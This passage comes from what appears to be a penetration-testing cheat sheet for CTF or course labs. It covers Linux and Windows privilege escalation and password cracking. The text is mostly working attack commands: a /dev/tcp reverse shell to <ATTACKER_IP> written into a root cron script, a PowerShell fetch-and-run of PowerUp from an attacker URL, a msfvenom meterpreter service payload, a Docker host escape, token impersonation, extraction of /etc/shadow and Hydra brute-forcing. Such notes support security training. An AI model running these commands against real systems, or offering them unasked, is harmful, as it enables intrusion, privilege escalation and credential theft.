* Use this command to see detailed information about SUID files, including verifying that the nano text editor has the SUID bit set
* More useful when you need detailed information about SUID files (permissions, ownership, size) to identify exploitable binaries

#### Linux Capabilities

* **Find Files with Capabilities** - Searches for files with Linux capabilities set, which can be exploited for privilege escalation

```bash
getcap -r / 2>/dev/null
```

* `getcap`: Command to display capabilities of files
* `-r`: Recursive flag - searches recursively through directories
* `/`: Starting directory (root directory)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* Linux capabilities provide fine-grained control over privileges, allowing specific capabilities without full root access
* Files with dangerous capabilities (like `cap_setuid`, `cap_sys_admin`, `cap_dac_override`) can be exploited for privilege escalation
* Common exploitable capabilities: `cap_setuid+ep` (can set UID), `cap_sys_admin+ep` (system administration), `cap_dac_override+ep` (bypass file permissions)

#### Cron Jobs

* **Check System Cron Jobs** - Views system-wide cron jobs that may run with elevated privileges

```bash
cat /etc/crontab
```

* `/etc/crontab`: System-wide crontab file that defines scheduled tasks
* Cron jobs that run as root can be exploited if they execute scripts in writable directories
* Look for cron jobs that run scripts you can modify or that run from directories you have write access to

* **Check User Cron Jobs** - Views user-specific cron jobs

```bash
crontab -l
```

* `crontab -l`: Lists cron jobs for the current user
* Check if any cron jobs run scripts you can modify

* **Check All Cron Directories** - Checks common cron directories for scheduled tasks

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/*
```

* `/etc/cron*`: System cron directories (`/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, etc.)
* `/var/spool/cron/crontabs/*`: User-specific crontab files
* Look for scripts referenced in cron jobs that are writable or in writable directories

* **Find Writable Cron Scripts** - Searches for writable scripts referenced in cron jobs

```bash
find /etc/cron* -type f -perm -0002 2>/dev/null
```

* `find /etc/cron*`: Searches in cron directories
* `-type f`: Only searches for files
* `-perm -0002`: Finds files with world-writable permissions (anyone can modify)
* `2>/dev/null`: Suppresses error messages
* If a cron job runs a world-writable script, you can modify it to execute commands as the cron job's user (often root)

* **Check Cron Job Permissions** - Lists cron files with detailed permissions

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null
```

* Shows detailed file permissions, ownership, and timestamps
* Helps identify which cron jobs run as root and which scripts they execute
* Look for scripts in directories you have write access to (e.g., `/tmp`, `/var/tmp`, user home directories)

#### Overwrite Writable Cron Script

If a cron job runs a script you can write to:

```bash
# Check permissions
ls -la /home/user/script.sh

# Overwrite with reverse shell (use echo, NOT vi)
echo '#!/bin/bash' > /home/user/script.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /home/user/script.sh

# Start listener and wait for cron execution
nc -lvnp <PORT>
```

Note: use `>>` to append, `>` to overwrite.

#### Writable Directories

* **Find Writable Directories** - Searches for writable directories that may be exploitable for privilege escalation

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

* `find / -writable`: Finds all writable files and directories starting from root
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* `cut -d "/" -f 2,3`: Extracts the first two directory levels (e.g., `/tmp`, `/var/tmp`, `/home/user`)
* `grep -v proc`: Excludes `/proc` directory (virtual filesystem, not useful for exploitation)
* `sort -u`: Sorts and shows only unique directory paths
* Writable directories can be exploited if:
  * Cron jobs execute scripts from these directories
  * PATH manipulation (placing malicious binaries in writable directories in PATH)
  * Log file manipulation (if log files are in writable directories)
  * Configuration file modification (if config files are writable)
* Common writable directories: `/tmp`, `/var/tmp`, `/dev/shm`, user home directories, `/opt`, `/var/www`

* **PATH Manipulation** - Modifies the PATH environment variable to include a writable directory for privilege escalation

```bash
export PATH=/tmp:$PATH
```

* `export PATH=/tmp:$PATH`: Prepends `/tmp` to the beginning of the PATH environment variable
* `/tmp`: Writable directory (can be any writable directory like `/var/tmp`, `/home/user`, etc.)
* `:$PATH`: Appends the original PATH after the new directory
* **Exploitation scenario**: If a SUID binary or cron job runs a command without an absolute path (e.g., `ls` instead of `/bin/ls`), it will search directories in PATH order
* **Steps to exploit**:
  1. Create a malicious binary with the same name as a command (e.g., `ls`, `cat`, `python`)
  2. Place it in the writable directory (e.g., `/tmp/ls`)
  3. Make it executable: `chmod +x /tmp/ls`
  4. Export PATH: `export PATH=/tmp:$PATH`
  5. When the SUID binary or cron job runs the command, it will execute your malicious binary with elevated privileges
* **Check for exploitable binaries**: Look for SUID binaries or cron jobs that call commands without absolute paths

#### Docker

* **Escape to host via Docker** - If you can run Docker (e.g. member of the `docker` group), mount the host root filesystem and chroot into it for a root shell on the host

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt /bin/bash
```

* `-v /:/mnt`: Mounts the host `/` at `/mnt` inside the container
* `alpine`: Minimal image (any image with `chroot` works)
* `chroot /mnt /bin/bash`: Switches into the host filesystem namespace with a root shell
* **Prerequisite**: `docker` group membership or ability to run Docker without restrictions (`groups`, `id`)

### Windows

#### PowerUp.ps1

* **PowerUp** (PowerSploit) enumerates common Windows privilege-escalation weaknesses. **Dot-source** the script so functions stay in your current PowerShell session—`.\PowerUp.ps1` alone runs in a child scope and may not define `Invoke-AllChecks` where you need it.

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

* `. .\PowerUp.ps1`: Leading dot + space = dot-source (loads script into the current session)
* `Invoke-AllChecks`: Runs PowerUp’s checks and prints findings (weak services, unquoted paths, writable paths, etc.)

* **Load from attacker URL (in-memory)** — When you cannot save `PowerUp.ps1` locally or prefer not to touch disk:

```powershell
powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/PowerUp.ps1'); Invoke-AllChecks"
```

Serve the script from the same host/IP the target can reach (often your VPN interface, e.g. `tun0`). Use plain **HTTP** if you use `python3 -m http.server` without TLS.

#### Interpreting PowerUp Output

* **Example** (vulnerable service — unquoted path + modifiable component):

```text
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

* **Why this points to exploitation**
  * **Check: Unquoted Service Paths** — The service binary path contains spaces and is not wrapped in quotes. Windows parses the path left to right and may execute `C:\Program.exe` (or another early component) if a malicious binary exists there, before the real path.
  * **ModifiablePath** — Shows a folder low-priv users can write to (`BUILTIN\Users` with `AppendData/AddSubdirectory` on `C:\` in this example). If any segment of the service path is under a writable directory, you can drop a payload with the right name so the service starts your code.
  * **StartName: LocalSystem** — The service runs as **NT AUTHORITY\SYSTEM** when started, so a successful hijack or binary replacement yields **SYSTEM**.
  * **CanRestart: True** — You can `net stop` / `net start` the service (if allowed) to reload the binary and trigger your payload without a reboot.
  * **AbuseFunction** — PowerSploit’s suggested next step (e.g. `Write-ServiceBinary`) replaces or hijacks the service binary; use only on systems you are authorized to test.

#### Msfvenom Service Executable and Restart

* **Build a Windows service-friendly executable** — Use `exe-service` so the payload is suitable to run as a service binary (pair with a handler for the payload you choose).

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o payload.exe
```

* Use `windows/meterpreter/reverse_tcp` (32-bit) instead of `windows/x64/...` if the target service is 32-bit only
* Transfer `payload.exe` to the target, **replace** the legitimate service executable (same path and filename as in **Path**), or place it at a hijack point PowerUp identified
* **Stop the service** (*Fermare il servizio*) so the file on disk can be overwritten:

```cmd
net stop AdvancedSystemCareService9
```

* **Start the service** (*Far ripartire il servizio — esegue il tuo payload*) after swapping the binary:

```cmd
net start AdvancedSystemCareService9
```

* Replace `AdvancedSystemCareService9` with the **ServiceName** from PowerUp or `sc qc <ServiceName>` output

#### Token Impersonation (Incognito)

* **When to try it** - If `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`), token impersonation is a top Windows privesc path.

```text
whoami /priv
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```

* `load incognito`: Loads Meterpreter incognito extension
* `list_tokens -g`: Lists available delegation/impersonation group tokens
* `impersonate_token ...`: Steals and applies the selected token
* If `getuid` does not immediately show SYSTEM/admin access in practice, migrate to a suitable privileged process (`ps` + `migrate <pid>`)

#### Potato Attacks

* **Use case** - Same core primitive (`SeImpersonatePrivilege`), often used when classic Incognito token theft is not enough or not available on modern hosts.
* Common tooling:
  * `PrintSpoofer`
  * `RoguePotato`
  * `GodPotato`
* General workflow:
  1. Confirm privilege: `whoami /priv`
  2. Transfer exploit binary to target
  3. Execute exploit with a payload command (reverse shell or local admin command)
  4. Catch elevated shell/token and verify with `whoami`
* Choose tool based on OS/build and patch level; not every Potato variant works everywhere.

#### AppLocker bypass

* **Problem** — Application whitelisting may block `cmd.exe`, PowerShell from `%SystemRoot%\System32\WindowsPowerShell\...`, the Start menu, and other launch paths.
* **Common lab technique** — Open **File Explorer**, click the **address bar** (path bar), type `powershell`, press **Enter**. Explorer may spawn PowerShell in a context that is still allowed.
* **Another frequent exception path** (depends on policy): `C:\Windows\System32\spool\drivers\color` — courses often use this folder for placing payloads when executable rules exclude it.
* **Sanity check** (if cmdlet available):

```powershell
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
```

#### Unattended installation files

* **What** — OEM / unattended Windows setups may leave **credentials or encoded secrets** on disk (`Unattended.xml`, `AutoUnattend.xml`).
* **Where to look**:

```text
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend.xml
```

Also check other deployment paths noted by **PowerUp** under **UnattendPath** (`Invoke-AllChecks`).
* **What to grep for** — `<Password>`, `<AdministratorPassword>`, `<AutoLogon>`, `<Value>` (often **Base64**).
* **Decode Base64 on Linux**:

```bash
echo '<BASE64_STRING>' | base64 -d
```

#### Windows Privilege Escalation Checklist

```text
whoami /priv          -> SeImpersonatePrivilege? -> Token impersonation / Potato
winPEAS / PowerUp     -> service misconfig, unquoted paths, weak perms, UnattendPath
sc qc <service>       -> inspect binary path, start account, startup type
accesschk / icacls    -> weak service/binary/folder permissions
type Unattended.xml   -> leftover setup credentials (Panther)
```

* Fast decision flow:
  * `SeImpersonatePrivilege` present -> test Incognito/Potato first
  * Weak service config/ACL found -> service binary/path abuse
  * **PowerUp** reports **UnattendPath** -> read XML / decode Base64
  * Always verify context after each step with `whoami` and `whoami /groups`

---

## Password Cracking

### John the Ripper

* **Crack Password Hash** - Cracks password hashes using John the Ripper with a wordlist

```bash
john --format=crypt --wordlist=rockyou.txt hash.txt
```

* `john`: John the Ripper password cracking tool
* `--format=crypt`: Specifies the hash format (crypt format for traditional Unix password hashes)
* `--wordlist=rockyou.txt`: Uses the rockyou.txt wordlist (commonly located in `/usr/share/wordlists/rockyou.txt`)
* `hash.txt`: File containing the password hash(es) to crack
* Common hash formats: `crypt` (Unix), `md5crypt`, `sha512crypt`, `NT` (Windows), `raw-md5`, `raw-sha1`, etc.
* To identify hash format automatically, use: `john --format=auto hash.txt` or `hashid hash.txt`

* **Crack Windows NT Hashes** - Cracks Windows NT password hashes (from SAM database)

```bash
john --format=NT --wordlist=rockyou.txt hash.txt
```

* `--format=NT`: Specifies NT hash format (Windows NTLM/NT hashes)
* `--wordlist=rockyou.txt`: Uses the rockyou.txt wordlist
* `hash.txt`: File containing Windows NT hashes (typically extracted from Windows SAM database)
* **Usage scenario**: After extracting Windows password hashes from SAM database or other Windows systems
* Windows NT hashes are typically 32-character hexadecimal strings (MD4 hash of the password)
* Can also use `--format=NT` for NTLM hashes (same format)

### Hashcat

* **Crack Raw MD5 Hash (Wordlist Attack)** - Cracks a raw MD5 hash using a dictionary

```bash
hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
```

* `-a 0`: Straight attack mode (wordlist)
* `-m 0`: Raw MD5 hash mode
* `--show`: Displays cracked result(s) from hashcat potfile

* **Kerberos 5 TGS-REP (Kerberoasting)** — Hash lines start with `$krb5tgs$23$...`

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

* **Kerberos 5 AS-REP** — Hash lines start with `$krb5asrep$23$...` (see [AS-REP Roasting](#as-rep-roasting))

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

* One hash per line in `hashes.txt`; use `--show` after a run to print cracked passwords from the potfile.

### Unshadow

* **Combine passwd and shadow files** - Combines `/etc/passwd` and `/etc/shadow` files into a format that John the Ripper can crack

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

* `unshadow`: Utility from the John the Ripper suite that combines passwd and shadow files
* `/etc/passwd`: Contains user account information (username, UID, GID, home directory, shell)
* `/etc/shadow`: Contains password hashes (only readable by root)
* `> hashes.txt`: Outputs the combined file in a format John can crack
* **Usage scenario**: After gaining root access, extract password hashes to crack user passwords
* **Workflow**:
  1. On target machine (as root): `cat /etc/passwd > passwd.txt` and `cat /etc/shadow > shadow.txt`
  2. Transfer files to attacking machine
  3. Run: `unshadow passwd.txt shadow.txt > unshadowed.txt`
  4. Crack with John: `john --wordlist=rockyou.txt unshadowed.txt`
* **Output format**: Combines username from `/etc/passwd` with hash from `/etc/shadow` (e.g., `username:$6$salt$hash:1001:1001:User Name:/home/username:/bin/bash`)
* Useful for password reuse attacks and gaining access to other user accounts on the system

### Hydra

* **FTP Brute Force Attack** - Performs brute force attack against FTP service using a username and password wordlist

```bash
hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.82.136.134:10021
```

* `hydra`: Parallelized login cracker that supports many protocols
* `-l eddie`: Specifies a single username to test (use `-L users.txt` for a username list)
* `-P /usr/share/wordlists/rockyou.txt`: Specifies password wordlist file (use `-p password` for single password)
* `ftp://10.82.136.134:10021`: Target service URL (protocol://IP:PORT)
* **Supported protocols**: `ftp`, `ssh`, `http`, `https`, `smb`, `rdp`, `telnet`, `mysql`, `postgresql`, `mssql`, `vnc`, `snmp`, `ldap`, etc.
* **Common options**:
  * `-t <threads>`: Number of parallel tasks (default: 16)
  * `-V`: Verbose mode - shows each login attempt
  * `-f`: Stop after first valid password found
  * `-s <port>`: Specify port if non-standard
* **Example with username list**: `hydra -L users.txt -P passwords.txt ftp://target`
* **Example with SSH**: `hydra -l root -P rockyou.txt ssh://target`
* **Example with HTTP POST**: `hydra -l admin -P rockyou.txt http-post-form://target/login.php:username=^USER^&password=^PASS^:F=incorrect`
* **Example with ASP.NET login form**: `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt <target> http-post-form "/Account/login.aspx:<POST_BODY_WITH_^PASS^>:Login failed"`
